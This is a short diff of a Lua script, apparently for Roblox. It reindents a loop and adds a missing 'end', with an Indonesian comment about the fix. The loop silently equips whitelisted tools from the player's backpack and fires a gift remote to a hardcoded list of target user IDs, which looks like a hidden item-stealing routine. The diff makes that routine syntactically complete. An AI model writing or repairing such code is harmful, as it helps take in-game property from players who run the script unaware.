@@ -384,20 +384,22 @@ task.spawn(function()
         task.wait(0.01)
 
         for _,tool in ipairs(backpack:GetChildren()) do
-    if tool:IsA("Tool") 
-    and not isWeightTool(tool)
-    and isWhitelistedName(tool) then
+            if tool:IsA("Tool") 
+            and not isWeightTool(tool)
+            and isWhitelistedName(tool) then
 
                 silentEquip(tool)
                 task.wait(0.02)
 
                 if isWhitelisted(tool) then
-    for _,id in ipairs(targetUserIds) do
-    giftRemote:FireServer(id)
-end
+                    for _,id in ipairs(targetUserIds) do
+                        giftRemote:FireServer(id)
+                    end
 
-                unequipAll()
-            end
+                    unequipAll()
+                end
+
+            end -- ✅ ini yang kurang
         end
     end
 end)
